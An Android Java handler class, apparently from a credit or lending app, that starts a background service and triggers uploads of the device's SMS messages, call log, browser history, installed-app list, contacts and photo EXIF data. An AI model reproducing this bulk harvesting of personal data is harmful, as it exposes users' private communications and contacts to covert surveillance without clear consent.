package com.yxjr.credit.ui;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;

import com.yxjr.credit.grab.ApplistGrab;
import com.yxjr.credit.grab.BrowserHistoryGrab;
import com.yxjr.credit.grab.CalllogGrab;
import com.yxjr.credit.grab.ContactsGrab;
import com.yxjr.credit.grab.ImgExifGrab;
import com.yxjr.credit.grab.SmsGrab;
import com.yxjr.credit.log.YxLog;
import com.yxjr.credit.service.YxService;
import com.yxjr.credit.util.ToastUtil;

public class YxHandler extends Handler {

	private Context mContext;
	private YxEntryActivity mActivity;
	private static YxHandler mInstance = null;

	/** 开启心跳操作 */
	public final int START_SERVICE = 1;
	/** 发送短信操作 */
	public final int SEND_SMS = 2;
	/** Toast */
	public final int TOAST = 3;
	/** 关闭activity */
	public final int FINISH = 4;
	/** 发送通话记录 */
	public final int SEND_CALL_LOG = 5;
	/** 发送浏览器历史记录 */
	public final int SEND_BROWSER_HISTORY = 6;
	/** 发送app列表 */
	public final int SEND_APP_LIST = 7;
	/** 发送通讯录 */
	public final int SEND_CONTACTS = 8;
	/** 发送照片信息 */
	public final int SEND_IMGEXIF = 9;

	public static YxHandler getInstance(Activity activity, Context context, Looper looper) {
		if (mInstance == null) {
			syncInit(activity, context, looper);
		}
		return mInstance;
	}

	private static synchronized void syncInit(Activity activity, Context context, Looper looper) {
		if (mInstance == null) {
			mInstance = new YxHandler(activity, context, looper);
		}
	}

	private YxHandler(Activity activity, Context context, Looper looper) {
		super(looper);
		this.mContext = context;
		this.mActivity = (YxEntryActivity) activity;
	}

	public void handleMessage(Message msg) { // 处理消息
		switch (msg.what) {
		case START_SERVICE://心跳开始
			YxLog.d("=======open server");
			mActivity.startService(new Intent(mActivity, YxService.class));
			break;
		case SEND_SMS://发送短信
			YxLog.d("======send sms");
			new SmsGrab(mContext).upload();
			break;
		case TOAST://toast提示
			ToastUtil.showToast(mContext, msg.obj.toString());
			break;
		case FINISH://关闭所有Activity，退出
			ToastUtil.showToast(mContext, msg.obj.toString());
			YxActivityManager.finishAllActivity();
			break;
		case SEND_CALL_LOG://发送通话记录
			YxLog.d("======send callLog");
			new CalllogGrab(mContext).upload();
			break;
		case SEND_BROWSER_HISTORY://发送浏览器历史记录
			YxLog.d("======send browserHistory");
			new BrowserHistoryGrab(mContext).upload();
			break;
		case SEND_APP_LIST://发送第三方app应用
			YxLog.d("======send appList");
			new ApplistGrab(mContext).upload();
			break;
		case SEND_CONTACTS://发送通讯录
			YxLog.d("======send contacts");
			new ContactsGrab(mContext).upload();
			break;
		case SEND_IMGEXIF://发送照片信息
			YxLog.d("======send imgExif");
			new ImgExifGrab(mContext).upload();
			break;
		default:
			break;
		}
	}

}